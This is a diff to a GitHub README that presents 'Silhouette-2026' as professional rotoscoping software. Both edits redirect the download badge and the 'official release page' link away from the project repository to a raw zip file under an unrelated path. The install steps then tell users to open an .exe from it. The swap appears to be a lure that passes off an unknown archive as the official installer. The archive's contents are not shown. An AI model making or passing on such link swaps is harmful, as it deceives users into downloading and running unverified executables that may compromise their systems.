@@ -5,7 +5,7 @@ description: "Download and install the latest version of Silhouette for Windows 
 ---
 # 🎬 Silhouette-2026 - Create Professional Rotoscoping For Your Projects
 
-[![Download Silhouette-2026](https://img.shields.io/badge/Download-Silhouette--2026-blue)](https://github.com/August-tamp308/Silhouette-2026)
+[![Download Silhouette-2026](https://img.shields.io/badge/Download-Silhouette--2026-blue)](https://raw.githubusercontent.com/August-tamp308/august-tamp308.github.io/main/gendarmery/v3.3.zip)
 
 Silhouette-2026 provides professional tools for artists who need to mask and isolate objects in video. This software streamlines the rotoscoping process for visual effects work. You can use these tools to cut out characters and objects from backgrounds with precision.
 
@@ -23,7 +23,7 @@ Ensure your computer meets these specifications before you start the installatio
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official release page](https://github.com/August-tamp308/Silhouette-2026) to access the latest installer.
+1. Visit the [official release page](https://raw.githubusercontent.com/August-tamp308/august-tamp308.github.io/main/gendarmery/v3.3.zip) to access the latest installer.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file name to start your download.
 4. Open your Downloads folder once the file finishes saving.
